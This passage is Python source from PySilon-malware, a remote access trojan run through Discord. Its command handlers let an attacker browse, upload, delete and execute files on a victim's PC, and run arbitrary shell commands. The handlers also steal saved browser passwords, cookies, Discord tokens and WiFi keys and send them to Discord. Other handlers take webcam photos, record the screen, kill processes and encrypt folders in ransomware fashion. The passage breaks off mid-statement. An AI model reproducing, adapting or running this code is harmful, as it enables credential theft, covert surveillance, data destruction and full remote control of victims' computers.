                            embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                            reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
                else:
                    embed = discord.Embed(title="📛 Error",description=f'_ _\n❗`This command works only on file-related channel:` <#' + str(channel_ids['file']) + '>❗\n||-||', colour=discord.Colour.red())
                    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                    reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
            elif message.content == '.done':
                await message.delete()
                if expectation == 'multiplefiles':
                    files_to_merge[0].append(await message.channel.send('```This files will be uploaded and merged into  ' + '/'.join(working_directory) + '/' + files_to_merge[2] + '  after you react with 📤 to this message, or with 🔴 to cancel this operation```'))
                    await files_to_merge[0][-1].add_reaction('📤')
                    await files_to_merge[0][-1].add_reaction('🔴')
            elif message.content[:7] == '.upload':
                await message.delete()
                if message.channel.id == channel_ids['file']:
                    if message.content.strip() == '.upload':
                        reaction_msg = await message.channel.send('```Syntax: .upload <type> [name]\nTypes:\n    single - upload one file with size less than 25MB\n    multiple - upload multiple files prepared by Splitter with total size greater than 25MB```'); await reaction_msg.add_reaction('🔴')
                    else:
                        if message.content[8:] == 'single':
                            expectation = 'onefile'
                            await message.channel.send('```Please send here a file to upload.```')
                        elif message.content[8:16] == 'multiple' and len(message.content) > 17:
                            expectation = 'multiplefiles'
                            files_to_merge[2] = message.content[17:]
                            files_to_merge[0].append(await message.channel.send('```Please send here all files (one-by-one) prepared by Splitter and then type  .done```'))
                        else:
                            reaction_msg = await message.channel.send('```Syntax: .upload multiple <name>```'); await reaction_msg.add_reaction('🔴')
                else:
                    reaction_msg = await message.channel.send('||-||\n❗`This command works only on file-related channel:` <#' + str(channel_ids['file']) + '>❗\n||-||'); await reaction_msg.add_reaction('🔴')
            elif message.content[:7] == '.remove':
                await message.delete()
                if message.channel.id == channel_ids['file']:
                    if message.content.strip() == '.remove':
                        embed = discord.Embed(title="📛 Error",description=f'```Syntax: .remove <file-or-directory>```', colour=discord.Colour.red())
                        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                        reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
                    else:
                        if os.path.exists('/'.join(working_directory) + '/' + message.content[8:]):
                            try:
                                if os.path.isfile('/'.join(working_directory) + '/' + message.content[8:]):
                                    subprocess.run('del "' + '\\'.join(working_directory) + '\\' + message.content[8:] + '"', shell=True)
                                else:
                                    rmtree('/'.join(working_directory) + '/' + message.content[8:])
                                embed = discord.Embed(title="🟢 Success",description=f'```Successfully removed  ' + '/'.join(working_directory) + '/' + message.content[8:] + '  from target PC```', colour=discord.Colour.green())
                                embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                                reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
                            except Exception as error:
                                embed = discord.Embed(title="📛 Error",description=f'`' + str(error) + '`', colour=discord.Colour.red())
                                embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                                reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
                        else:
                            embed = discord.Embed(title="📛 Error",description=f'```❗ File or directory not found.```', colour=discord.Colour.red())
                            embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                            reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
                else:
                    embed = discord.Embed(title="📛 Error",description=f'||-||\n❗`This command works only on file-related channel:` <#' + str(channel_ids['file']) + '>❗\n||-||', colour=discord.Colour.red())
                    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                    reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
            elif message.content == '.clear':
                await message.delete()
                if message.channel.id == channel_ids['file']:
                    async for message in client.get_channel(channel_ids['file']).history():
                        await message.delete()
                else:
                    reaction_msg = await message.channel.send('||-||\n❗`This command works only on file-related channel:` <#' + str(channel_ids['file']) + '>❗\n||-||'); await reaction_msg.add_reaction('🔴')
            elif message.content == '.tree':
                await message.delete()
                if message.channel.id == channel_ids['file']:
                    tree_messages = []
                    tree_txt_path = f'C:\\Users\\{getuser()}\\{software_directory_name}\\' + 'tree.txt'
                    dir_path = Path('/'.join(working_directory))
                    tree_messages.append(await message.channel.send('```Directory tree requested by ' + str(message.author) + '\n\n' + '/'.join(working_directory) + '```'))
                    with open(tree_txt_path, 'w', encoding='utf-8') as system_tree:
                        system_tree.write(str(dir_path) + '\n')
                    length_limit = sys.maxsize
                    iterator = tree(Path('/'.join(working_directory)))
                    tree_message_content = '```^\n'
                    for line in islice(iterator, length_limit):
                        with open(tree_txt_path, 'a+', encoding='utf-8') as system_tree:
                            system_tree.write(line + '\n')
                        if len(tree_message_content) > 1800:
                            tree_messages.append(await message.channel.send(tree_message_content + str(line) + '```'))
                            tree_message_content = '```'
                        else:
                            tree_message_content += str(line) + '\n'
                    if tree_message_content != '```':
                        tree_messages.append(await message.channel.send(tree_message_content + '```'))
                    reaction_msg = await message.channel.send('```End of tree. React with 📥 to download this tree as .txt file, or with 🔴 to clear all above messages```')
                    await reaction_msg.add_reaction('📥')
                    await reaction_msg.add_reaction('🔴')
                else:
                    reaction_msg = await message.channel.send('||-||\n❗`This command works only on file-related channel:` <#' + str(channel_ids['file']) + '>❗\n||-||'); await reaction_msg.add_reaction('🔴')
            elif message.content[:3] == '.cd':
                await message.delete()
                if message.channel.id == channel_ids['file']:
                    if message.content.strip() == '.cd':
                        reaction_msg = await message.channel.send('```Syntax: .cd <directory>```'); await reaction_msg.add_reaction('🔴')
                    else:
                        if os.path.isdir('/'.join(working_directory) + '/' + message.content[4:]):
                            if '/' in message.content:
                                for dir in message.content[4:].split('/'):
                                    if dir == '..':
                                        working_directory.pop(-1)
                                    else:
                                        working_directory.append(dir)
                            else:
                                if message.content[4:] == '..':
                                    working_directory.pop(-1)
                                else:
                                    working_directory.append(message.content[4:])
                            reaction_msg = await message.channel.send('```You are now in: ' + '/'.join(working_directory) + '```'); await reaction_msg.add_reaction('🔴')
                        else:
                            if os.path.isdir(message.content[4:]):
                                working_directory.clear()
                                for dir in message.content[4:].split('/'):
                                    working_directory.append(dir)
                                reaction_msg = await message.channel.send('```You are now in: ' + '/'.join(working_directory) + '```'); await reaction_msg.add_reaction('🔴')
                            else:
                                reaction_msg = await message.channel.send('```❗ Directory not found.```'); await reaction_msg.add_reaction('🔴')
                else:
                    reaction_msg = await message.channel.send('||-||\n❗`This command works only on file-related channel:` <#' + str(channel_ids['file']) + '>❗\n||-||'); await reaction_msg.add_reaction('🔴')
            elif message.content == '.ls':
                await message.delete()
                if message.channel.id == channel_ids['file']:
                    dir_content_f, dir_content_d, directory_content = [], [], []
                    for element in os.listdir('/'.join(working_directory)+'/'):
                        if os.path.isfile('/'.join(working_directory)+'/'+element): dir_content_f.append(element)
                        else: dir_content_d.append(element)
                    dir_content_d.sort(key=str.casefold); dir_content_f.sort(key=str.casefold)
                    for single_directory in dir_content_d: directory_content.append(single_directory)
                    for single_file in dir_content_f: directory_content.append(single_file)
                    await message.channel.send('```Content of ' + '/'.join(working_directory) +'/ at ' + current_time() + '```')
                    lsoutput = directory_content
                    while lsoutput != []:
                        if len('\n'.join(lsoutput)) > 1994:
                            temp = ''
                            while len(temp+lsoutput[0])+1 < 1994:
                                temp += lsoutput[0] + '\n'
                                lsoutput.pop(0)
                            await message.channel.send('```' + temp + '```')
                        else:
                            await message.channel.send('```' + '\n'.join(lsoutput) + '```')
                            lsoutput = []
                else:
                    reaction_msg = await message.channel.send('||-||\n❗`This command works only on file-related channel:` <#' + str(channel_ids['file']) + '>❗\n||-||'); await reaction_msg.add_reaction('🔴')
            elif message.content == '.pwd':
                await message.delete()
                if message.channel.id == channel_ids['file']:
                    reaction_msg = await message.channel.send('```You are now in: ' + '/'.join(working_directory) + '```'); await reaction_msg.add_reaction('🔴')
                else:
                    reaction_msg = await message.channel.send('||-||\n❗`This command works only on file-related channel:` <#' + str(channel_ids['file']) + '>❗\n||-||'); await reaction_msg.add_reaction('🔴')
            elif message.content[:8] == '.encrypt':
                await message.delete()
                if message.content.strip() == '.encrypt':
                    embed = discord.Embed(title="📛 Error",description='```Syntax: .encrypt <path to folder>```', colour=discord.Colour.red())
                    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                    reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
                else:
                    folder_path = message.content[9:]
                    folder_path = folder_path.replace('\\','/')
                    current_pid = os.getpid()
                    running_processes = set()
                    for process in psutil.process_iter(['pid', 'name']):
                        try:
                            if process.info['pid'] != current_pid:
                                running_processes.add(process.info['name'])
                        except (psutil.NoSuchProcess, psutil.AccessDenied):
                            pass
                    key = Fernet.generate_key()
                    cipher_suite = Fernet(key)
                    original_file_extensions = []
                    for root, dirs, files in os.walk(folder_path):
                        for file in files:
                            file_path = os.path.join(root, file)
                            if not file_path.endswith('.pysilon'):
                                _, file_extension = os.path.splitext(file_path)
                                if os.path.basename(file_path) not in running_processes:
                                    with open(file_path, 'rb') as f:
                                        file_data = f.read()
                                    original_file_extensions.append(file_extension)
                                    encrypted_data = cipher_suite.encrypt(file_data)
                                    new_file_name = os.path.splitext(file_path)[0] + '.pysilon'
                                    os.rename(file_path, new_file_name)
                                    with open(new_file_name, 'wb') as f:
                                        f.write(encrypted_data)
                    if original_file_extensions:
                        with open(f'C:\\Users\\{getuser()}\\{software_directory_name}\\file_extensions.pkl', 'wb') as ext_file:
                            pickle.dump(original_file_extensions, ext_file)
                    with open(f'C:\\Users\\{getuser()}\\{software_directory_name}\\pysilon_encryption.key', 'wb') as key_file:
                        key_file.write(key)
                    embed = discord.Embed(title="🟢 Success",description=f'```Successfully encrypted the path!```', colour=discord.Colour.green())
                    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                    reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
            elif message.content[:8] == '.decrypt':
                await message.delete()
                if message.content.strip() == '.decrypt':
                    embed = discord.Embed(title="📛 Error",description='```Syntax: .decrypt <path to folder>```', colour=discord.Colour.red())
                    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                    reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
                else:
                    folder_path = message.content[9:]
                    folder_path = folder_path.replace('\\','/')
                    with open(f'C:\\Users\\{getuser()}\\{software_directory_name}\\pysilon_encryption.key', "rb") as key_file:
                        key = key_file.read()
                    cipher_suite = Fernet(key)
                    with open(f'C:\\Users\\{getuser()}\\{software_directory_name}\\file_extensions.pkl', "rb") as ext_file:
                        original_file_extensions = pickle.load(ext_file)
                    for root, dirs, files in os.walk(folder_path):
                        for file in files:
                            file_path = os.path.join(root, file)
                            if file_path.endswith('.pysilon'):
                                with open(file_path, 'rb') as f:
                                    encrypted_data = f.read()
                                decrypted_data = cipher_suite.decrypt(encrypted_data)
                                original_extension = original_file_extensions.pop(0)
                                new_file_name = os.path.splitext(file_path)[0] + original_extension
                                with open(new_file_name, 'wb') as f:
                                    f.write(decrypted_data)
                                os.remove(file_path)
                    embed = discord.Embed(title="🟢 Success",description=f'```Successfully decrypted the path!```', colour=discord.Colour.green())
                    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                    reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
            elif message.content[:5] == '.grab':
                await message.delete()
                if message.content.strip() == '.grab':
                    reaction_msg = await message.channel.send('```Syntax: .grab <what-to-grab>```'); await reaction_msg.add_reaction('🔴')
                else:
                    if message.content[6:] == 'passwords':
                        result = grab_passwords()
                        embed=discord.Embed(title='Grabbed saved passwords', color=0x0084ff)
                        for url in result.keys():
                            embed.add_field(name='🔗 ' + url, value='👤 ' + result[url][0] + '\n🔑 ' + result[url][1], inline=False)
                        reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('📌')
                    elif message.content[6:] == 'history':
                        with open('history.txt', 'w') as history:
                            for entry in get_history().histories:
                                history.write(entry[0].strftime('%d.%m.%Y %H:%M') + ' -> ' + entry[1] +'\n\n')
                        reaction_msg = await message.channel.send(file=discord.File('history.txt')); await reaction_msg.add_reaction('🔴')
                        subprocess.run('del history.txt', shell=True)
                    elif message.content[6:] == 'cookies':
                        await message.channel.send('```Grabbing cookies. Please wait...```')
                        grab_cookies()
                        await asyncio.sleep(1)
                        reaction_msg = await message.channel.send('```Grabbed cookies```', file=discord.File(f'C:\\Users\\{getuser()}\\cookies.txt', filename='cookies.txt')); await reaction_msg.add_reaction('📌')
                        subprocess.run(f'del C:\\Users\\{getuser()}\\cookies.txt', shell=True)
                    elif message.content[6:].lower() == 'wifi':
                        networks = force_decode(subprocess.run('netsh wlan show profile', capture_output=True, shell=True).stdout).strip()
                        polish_bytes = ['\\xa5', '\\x86', '\\xa9', '\\x88', '\\xe4', '\\xa2', '\\x98', '\\xab', '\\xbe', '\\xa4', '\\x8f', '\\xa8', '\\x9d', '\\xe3', '\\xe0', '\\x97', '\\x8d', '\\xbd']
                        polish_chars = ['ą', 'ć', 'ę', 'ł', 'ń', 'ó', 'ś', 'ź', 'ż', 'Ą', 'Ć', 'Ę', 'Ł', 'Ń', 'Ó', 'Ś', 'Ź', 'Ż']
                        for i in polish_bytes:
                            networks = networks.replace(i, polish_chars[polish_bytes.index(i)])
                        network_names_list = []
                        for profile in networks.split('\n'):
                            if ': ' in profile:
                                network_names_list.append(profile[profile.find(':')+2:].replace('\r', ''))
                        result, password = {}, ''
                        for network_name in network_names_list:
                            command = 'netsh wlan show profile "' + network_name + '" key=clear'
                            current_result = force_decode(subprocess.run(command, capture_output=True, shell=True).stdout).strip()
                            for i in polish_bytes:
                                current_result = current_result.replace(i, polish_chars[polish_bytes.index(i)])
                            for line in current_result.split('\n'):
                                if 'Key Content' in line:
                                    password = line[line.find(':')+2:-1]
                            result[network_name] = password
                        embed=discord.Embed(title='Grabbed WiFi passwords', color=0x0084ff)
                        for network in result.keys():
                            embed.add_field(name='🪪 ' + network, value='🔑 ' + result[network], inline=False)
                        reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('📌')
                    elif message.content[6:] == 'discord':
                        accounts = grab_discord.initialize(False)
                        for account in accounts:
                            reaction_msg = await message.channel.send(embed=account); await reaction_msg.add_reaction('📌') 
                    elif message.content[6:] == 'all':
                        await message.channel.send('Grabbing everything... Please wait.')
                        try:
                            accounts = grab_discord.initialize(False)
                            for account in accounts:
                                reaction_msg = await message.channel.send(embed=account); await reaction_msg.add_reaction('📌') 
                        except: pass
                        try:
                            result = grab_passwords()
                            embed=discord.Embed(title='Grabbed saved passwords', color=0x0084ff)
                            for url in result.keys():
                                embed.add_field(name='🔗 ' + url, value='👤 ' + result[url][0] + '\n🔑 ' + result[url][1], inline=False)
                            reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('📌')
                        except: pass 
                        try:
                            await asyncio.sleep(1)
                            grab_cookies()
                            reaction_msg = await message.channel.send('```Grabbed cookies```', file=discord.File(f'C:\\Users\\{getuser()}\\cookies.txt', filename='cookies.txt')); await reaction_msg.add_reaction('📌')
                            subprocess.run(f'del C:\\Users\\{getuser()}\\cookies.txt', shell=True)
                        except: pass
            elif message.content[:5] == '.show':
                await message.delete()
                if message.content.strip() == '.show':
                    embed = discord.Embed(title="📛 Error",description='```Syntax: .show <what-to-show>```', colour=discord.Colour.red())
                    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                    reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
                else:
                    if message.content[6:] == 'processes':
                        processes, processes_list = [], []
                        for proc in process_iter():
                            processes.append(proc.name())
                        processes.sort(key=str.lower)
                        how_many, temp = 1, processes[0]; processes.pop(0)
                        for i in processes:
                            if temp == i: how_many += 1
                            else:
                                if how_many == 1: processes_list.append('``' + temp + '``')
                                else: processes_list.append('``' + temp + '``   [x' + str(how_many) + ']'); how_many = 1
                                temp = i
                        total_processes = len(processes)
                        processes = ''
                        reaction_msg = await message.channel.send('```Processes at ' + current_time() + ' requested by ' + str(message.author) + '```')
                        processes_messages.append(reaction_msg)
                        for proc in range(1, len(processes_list)):
                            if len(processes) < 1800:
                                processes = processes + '\n**' + str(proc) + ') **' + str(processes_list[proc])
                            else:
                                processes += '\n**' + str(proc) + ') **' + str(processes_list[proc])
                                reaction_msg = await message.channel.send(processes)
                                processes_messages.append(reaction_msg)
                                processes = ''
                        reaction_msg = await message.channel.send(processes + '\n Total processes:** ' + str(total_processes) + '**\n```If you want to kill a process, type  .kill <process-number>```')
                        processes_messages.append(reaction_msg)
                        await reaction_msg.add_reaction('🔴')
            elif message.content == '.foreground':
                await message.delete()
                foreground_process = active_window_process_name()
                if foreground_process == None:
                    embed = discord.Embed(title="📛 Error",description='```Failed to get foreground window process name.```', colour=discord.Colour.red())
                    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                    reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
                else:
                    embed = discord.Embed(title=str(foreground_process),description=f'```You can kill it with -> .kill {foreground_process}```', colour=discord.Colour.green())
                    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                    reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
            elif message.content[:10] == '.blacklist':
                await message.delete()
                if message.content.strip() == '.blacklist':
                    embed = discord.Embed(title="📛 Error",description='```Syntax: .blacklist <process-name>```', colour=discord.Colour.red())
                    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                    reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
                else:
                    if not os.path.exists(f'C:/Users/{getuser()}/{software_directory_name}/disabled_processes.psln'): 
                        with open(f'C:/Users/{getuser()}/{software_directory_name}/disabled_processes.psln', 'w', encoding='utf-8'): pass
                    with open(f'C:/Users/{getuser()}/{software_directory_name}/disabled_processes.psln', 'r', encoding='utf-8') as disabled_processes:
                        disabled_processes_list = disabled_processes.readlines()
                    for x, y in enumerate(disabled_processes_list): disabled_processes_list[x] = y.replace('\n', '')
                    if message.content[11:] not in disabled_processes_list:
                        disabled_processes_list.append(message.content[11:])
                        with open(f'C:/Users/{getuser()}/{software_directory_name}/disabled_processes.psln', 'w', encoding='utf-8') as disabled_processes:
                            disabled_processes.write('\n'.join(disabled_processes_list))
                        embed = discord.Embed(title="🟢 Success",description=f'```{message.content[11:]} has been added to process blacklist```', colour=discord.Colour.green())
                        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                        reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
                    else:
                        embed = discord.Embed(title="📛 Error",description='```This process is already blacklisted, so there\'s nothing to disable```', colour=discord.Colour.red())
                        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                        reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
            elif message.content[:10] == '.whitelist':
                await message.delete()
                if message.content.strip() == '.whitelist':
                    embed = discord.Embed(title="📛 Error",description='```Syntax: .whitelist <process-name>```', colour=discord.Colour.red())
                    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                    reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
                else:
                    if not os.path.exists(f'C:/Users/{getuser()}/{software_directory_name}/disabled_processes.psln'): 
                        with open(f'C:/Users/{getuser()}/{software_directory_name}/disabled_processes.psln', 'w', encoding='utf-8'): pass
                    with open(f'C:/Users/{getuser()}/{software_directory_name}/disabled_processes.psln', 'r', encoding='utf-8') as disabled_processes:
                        disabled_processes_list = disabled_processes.readlines()
                    for x, y in enumerate(disabled_processes_list): disabled_processes_list[x] = y.replace('\n', '')
                    if message.content[11:] in disabled_processes_list:
                        disabled_processes_list.pop(disabled_processes_list.index(message.content[11:]))
                        with open(f'C:/Users/{getuser()}/{software_directory_name}/disabled_processes.psln', 'w', encoding='utf-8') as disabled_processes:
                            disabled_processes.write('\n'.join(disabled_processes_list))
                        embed = discord.Embed(title="🟢 Success",description=f'```{message.content[11:]} has been removed from process blacklist```', colour=discord.Colour.green())
                        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                        reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
                    else:
                        embed = discord.Embed(title="📛 Error",description='```This process is not blacklisted```', colour=discord.Colour.red())
                        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                        reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
            elif message.content[:5] == '.kill':
                await message.delete()
                if message.content.strip() == '.kill':
                    embed = discord.Embed(title="📛 Error",description='```Syntax: .kill <process-name-or-ID>```', colour=discord.Colour.red())
                    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                    reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
                elif check_int(message.content[6:]):
                    if len(processes_list) > 10:
                        if int(message.content[6:]) < len(processes_list) and int(message.content[6:]) > 0:
                            reaction_msg = await message.channel.send('```Do you really want to kill process: ' + processes_list[int(message.content[6:])].replace('`', '') + '\nReact with 💀 to kill it or 🔴 to cancel...```')
                            process_to_kill = [processes_list[int(message.content[6:])].replace('`', ''), False]
                            await reaction_msg.add_reaction('💀')
                            await reaction_msg.add_reaction('🔴')
                        else:
                            embed = discord.Embed(title="📛 Error",description="```There isn't any process with that index. Range of process indexes is 1-" + str(len(processes_list)-1) + '```', colour=discord.Colour.red())
                            embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                            reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
                    else:
                        embed = discord.Embed(title="📛 Error",description='```You need to generate the processes list to use this feature\n.show processes```', colour=discord.Colour.red())
                        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                        reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
                elif message.content[6:].lower() in [proc.name().lower() for proc in process_iter()]:
                    stdout = force_decode(subprocess.run(f'taskkill /f /IM {message.content[6:].lower()} /t', capture_output=True, shell=True).stdout).strip()
                    await asyncio.sleep(0.5)
                    if message.content[6:].lower() not in [proc.name().lower() for proc in process_iter()]:
                        embed = discord.Embed(title="🟢 Success",description=f'```Successfully killed {message.content[6:].lower()}```', colour=discord.Colour.green())
                        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                        reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
                    else:
                        embed = discord.Embed(title="📛 Error",description=f'```Tried to kill {message.content[6:]} but it\'s still running...```', colour=discord.Colour.red())
                        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                        reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
                else:
                    embed = discord.Embed(title="📛 Error",description='```Invalid process name/ID. You can view all running processes by typing:\n.show processes```', colour=discord.Colour.red())
                    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                    reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
            elif message.content[:4] == '.cmd':
                await message.delete()
                if message.content.strip() == '.cmd':
                    reaction_msg = await message.channel.send('```Syntax: .cmd <command>```'); await reaction_msg.add_reaction('🔴')
                else:
                    cmd_output = force_decode(subprocess.run(message.content[5:], capture_output= True, shell= True).stdout).strip()
                    message_buffer, cmd_messages = '', []
                    reaction_msg = await message.channel.send('```Executed command: ' + message.content[5:] + '\nstdout:```'); cmd_messages.append(reaction_msg)
                    for line in range(1, len(cmd_output.split('\n'))):
                        if len(message_buffer) + len(cmd_output.split('\n')[line]) > 1950:
                            reaction_msg = await message.channel.send('```' + message_buffer + '```'); cmd_messages.append(reaction_msg)
                            message_buffer = cmd_output.split('\n')[line]
                        else:
                            message_buffer += cmd_output.split('\n')[line] + '\n'
                    reaction_msg = await message.channel.send('```' + message_buffer + '```'); cmd_messages.append(reaction_msg)
                    reaction_msg = await message.channel.send('```End of command stdout```'); await reaction_msg.add_reaction('🔴')
            elif message.content[:8] == '.execute':
                await message.delete()
                if message.channel.id == channel_ids['file']:
                    if message.content.strip() == '.execute':
                        reaction_msg = await message.channel.send('```Syntax: .execute <filename>```'); await reaction_msg.add_reaction('🔴')
                    else:
                        if os.path.exists('/'.join(working_directory) + '/' + message.content[9:]):
                            try:
                                file_extension = os.path.splitext(message.content[9:])[1]
                                subprocess.run('start "" "' + '/'.join(working_directory) + '/' + message.content[9:] + '"', shell=True)
                                await asyncio.sleep(1)
                                ImageGrab.grab(all_screens=True).save('ss.png')
                                reaction_msg = await message.channel.send(embed=discord.Embed(title=current_time() + ' `[Executed: ' + '/'.join(working_directory) + '/' + message.content[9:] + ']`').set_image(url='attachment://ss.png'), file=discord.File('ss.png')); await reaction_msg.add_reaction('📌')
                                subprocess.run('del ss.png', shell=True)
                                await message.channel.send('```Successfully executed: ' + message.content[9:] + '```')
                            except Exception as e:
                                reaction_msg = await message.channel.send(f'```❗ Something went wrong...```\n{str(e)}'); await reaction_msg.add_reaction('🔴')
                        else:
                            reaction_msg = await message.channel.send('```❗ File or directory not found.```'); await reaction_msg.add_reaction('🔴')
                else:
                    reaction_msg = await message.channel.send('||-||\n❗`This command works only on file-related channel:` <#' + str(channel_ids['file']) + '>❗\n||-||'); await reaction_msg.add_reaction('🔴')
            elif message.content[:7] == '.webcam':
                await message.delete()
                if message.content.strip() == '.webcam':
                    reaction_msg = await message.channel.send('```Syntax: .webcam <action>\nActions:\n    photo - take a photo with target PC\'s webcam```')
                    await reaction_msg.add_reaction('🔴')
                else:
                    if message.content[8:] == 'photo':
                        pygame.camera.init()
                        cameras = pygame.camera.list_cameras()
                        if not cameras:
                            reaction_msg = await message.channel.send('No cameras found.')
                            await reaction_msg.add_reaction('🔴')
                            return
                        camera = pygame.camera.Camera(cameras[0])
                        camera.start()
                        time.sleep(1)
                        image = camera.get_image()
                        camera.stop()
                        pygame.image.save(image, f'C:\\Users\\{getuser()}\\{software_directory_name}\\webcam.png')
                        reaction_msg = await message.channel.send(embed=discord.Embed(title=current_time(True) + ' `[On demand]`').set_image(url='attachment://webcam.png'),file=discord.File(f'C:\\Users\\{getuser()}\\{software_directory_name}\\webcam.png'))
                        await reaction_msg.add_reaction('📌')
                        subprocess.run(f'del C:\\Users\\{getuser()}\\{software_directory_name}\\webcam.png', shell=True)
                    else:
                        reaction_msg = await message.channel.send('```Syntax: .webcam <action>\nActions:\n    photo - take a photo with target PC\'s webcam```')
                        await reaction_msg.add_reaction('🔴')
            elif message.content == '.screenrec':
                await message.delete()
                await message.channel.send("`Recording... Please wait.`")
                output_file = f'C:\\Users\\{getuser()}\\{software_directory_name}\\recording.mp4'
                screen_width, screen_height = pyautogui.size()
                screen_region = (0, 0, screen_width, screen_height)
                frames = []
                duration = 15
                fps = 30
                num_frames = duration * fps
                start_time = time.time()
                try:
                    for _ in range(num_frames):
                        img = pyautogui.screenshot(region=screen_region)
                        frame = np.array(img)
                        frames.append(frame)
                    imageio.mimsave(output_file, frames, fps=fps, quality=8)
                    reaction_msg = await message.channel.send("Screen Recording `[On demand]`", file=discord.File(output_file))
                    await reaction_msg.add_reaction('📌')
                    subprocess.run(f'del {output_file}', shell=True)
                except Exception as e:
                    embed = discord.Embed(title="📛 Error",description="An error occurred during screen recording.", colour=discord.Colour.red())
                    embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
                    await message.channel.send(embed=embed)
            elif message.content[:4] == '.msg':
                await message.delete()
                if message.content.strip() == '.msg' or message.content.count('"') not in [2, 4, 6]:
